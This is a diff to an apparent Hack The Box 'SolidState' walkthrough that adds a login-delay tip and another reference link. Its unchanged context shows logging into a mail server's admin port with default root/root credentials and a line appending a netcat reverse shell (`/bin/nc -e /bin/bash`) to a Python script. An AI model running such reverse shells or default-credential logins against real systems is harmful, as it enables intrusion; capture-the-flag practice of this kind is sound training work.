@@ -46,6 +46,7 @@ gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -
 
 ### 1.Method:
 + Connect to port 4555 with `root`-`root` using nc: `nc 10.10.10.51 4555`
++ When you first start the TCP connection with the server, it takes a moment before you're prompted to login. Be patient!
 + List commands: `HELP`
 + To list users: `listusers`
 
@@ -184,4 +185,5 @@ echo "os.system('/bin/nc -e /bin/bash 10.10.14.10 4444')" >> tmp.py
 + https://vvmlist.github.io/#solidstate
 + https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html
 + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/solidstate-writeup-w-o-metasploit
++ https://benheater.com/hackthebox-solidstate/
 + 
